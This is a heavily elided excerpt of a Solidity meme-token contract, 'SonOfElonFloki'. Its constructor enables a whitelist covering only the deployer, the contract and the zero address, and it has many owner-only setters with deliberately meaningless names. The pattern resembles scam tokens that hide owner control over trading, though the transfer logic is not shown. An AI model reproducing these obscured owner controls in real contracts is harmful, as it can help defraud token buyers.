...
contract SonOfElonFloki is Context, IERC20, Ownable {
    ...
    uint256 public _buyBackMilipercent = 6000;
    ...
    constructor() {
        _name = 'SonOfElonFloki';
        _symbol = 'ElonFloki';
        _decimals = 9;
        _totalSupply = 7 * 10**6 * 10**9;
        ...
        _whiteListEnabled = true;
        setWiolmoonData(address(0), true);
        setWiolmoonData(address(this), true);
        setWiolmoonData(_msgSender(), true);
     ...
     * @return boolean.
     */
    function setMMAddressDL(address account) external onlyOwner returns (bool) {
     ...
     * @return boolean.
     */
    function setBBAddressMM(address account) external onlyOwner returns (bool) {
     ...
     * @return boolean
     */
    function setMarkMMKKds(uint256 value) external onlyOwner returns (bool) {
     ...
     * @return boolean
     */
    function setBggs(uint256 value) external onlyOwner returns (bool) {
     ...
     * @return boolean
     */
    function setMinimumDAllDbs(uint256 value) external onlyOwner returns (bool) {
     ...
     * @return boolean
     */
    function setWsolasomor(bool value) public onlyOwner returns (bool) {
        _whiteListEnabled = value;
        return true;
    }

    function setNftmerlin(bool value) public onlyOwner returns (bool) {
        _nftIntegrating = value;
        return true;
    }

    function setNftpragma(address account, bool value) public onlyOwner returns (bool) {
     ...
     * @return boolean
     */
    function setWiolmoonData(address account, bool value) public onlyOwner returns (bool) {
